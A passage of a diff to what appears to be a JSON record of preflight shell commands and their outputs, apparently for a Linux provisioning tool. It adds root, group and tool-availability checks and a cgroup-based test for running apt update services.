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'\"'\"')))'",
+      "exit": 0,
+      "stdout": "[]\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "id -u",
+      "exit": 0,
+      "stdout": "0\n",
       "truncated": false,
       "stdin_sha256": null
     },
@@ -432,6 +456,13 @@
       "stdin_sha256": null
     },
     {
+      "command": "getent group 30000",
+      "exit": 2,
+      "stdout": "",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
       "command": "command -v apt-get",
       "exit": 0,
       "stdout": "/usr/bin/apt-get\n",
@@ -488,6 +519,111 @@
       "stdin_sha256": null
     },
     {
+      "command": "command -v curl",
+      "exit": 0,
+      "stdout": "/usr/bin/curl\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v sha256sum",
+      "exit": 0,
+      "stdout": "/usr/bin/sha256sum\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v tar",
+      "exit": 0,
+      "stdout": "/usr/bin/tar\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v xz",
+      "exit": 0,
+      "stdout": "/usr/bin/xz\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v flock",
+      "exit": 0,
+      "stdout": "/usr/bin/flock\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v journalctl",
+      "exit": 0,
+      "stdout": "/usr/bin/journalctl\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v systemd-analyze",
+      "exit": 0,
+      "stdout": "/usr/bin/systemd-analyze\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v readlink",
+      "exit": 0,
+      "stdout": "/usr/bin/readlink\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v stat",
+      "exit": 0,
+      "stdout": "/usr/bin/stat\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v awk",
+      "exit": 0,
+      "stdout": "/usr/bin/awk\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v sed",
+      "exit": 0,
+      "stdout": "/usr/bin/sed\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v grep",
+      "exit": 0,
+      "stdout": "/usr/bin/grep\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v /usr/sbin/useradd",
+      "exit": 0,
+      "stdout": "/usr/sbin/useradd\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v /usr/sbin/groupadd",
+      "exit": 0,
+      "stdout": "/usr/sbin/groupadd\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
+      "command": "command -v /usr/sbin/runuser",
+      "exit": 0,
+      "stdout": "/usr/sbin/runuser\n",
+      "truncated": false,
+      "stdin_sha256": null
+    },
+    {
       "command": "timedatectl show -p NTPSynchronized --value",
       "exit": 0,
       "stdout": "yes\n",
@@ -495,9 +631,9 @@
       "stdin_sha256": null
     },
     {
-      "command": "systemctl is-active apt-daily.service apt-daily-upgrade.service unattended-upgrades.service",
-      "exit": 3,
-      "stdout": "inactive\ninactive\ninactive\n",
+      "command": "/usr/bin/sh -c 'for unit in apt-daily.service apt-daily-upgrade.service \\\nunattended-upgrades.service; do\nreport=$(systemctl show --property=LoadState --property=ControlGroup \"$unit\") || exit 2\nload=$(printf '\"'\"'%s\\n'\"'\"' \"$report\" | sed -n '\"'\"'s/^LoadState=//p'\"'\"')\ncase \"$load\" in loaded|not-found|masked) ;; *) exit 2 ;; esac\ncg=$(printf '\"'\"'%s\\n'\"'\"' \"$report\" | sed -n '\"'\"'s/^ControlGroup=//p'\"'\"')\n[ -n \"$cg\" ] || cg=\"/system.slice/$unit\"\ncase \"$cg\" in /system.slice/*) ;; *) exit 2 ;; esac\ncase \"$cg\" in *..*|*'\"'\"' '\"'\"'*|*'\"'\"'\n'\"'\"'*) exit 2 ;; esac\nevents=\"/sys/fs/cgroup$cg/cgroup.events\"\n[ -e \"$events\" ] || continue\n[ -r \"$events\" ] || exit 2\ngrep -qx '\"'\"'populated 1'\"'\"' \"$events\" && exit 1\ngrep -qx '\"'\"'populated 0'\"'\"' \"$events\" || exit 2\ndone\nexit 0'",
+      "exit": 0,
+      "stdout": "",
       "truncated": false,
       "stdin_sha256": null
     },
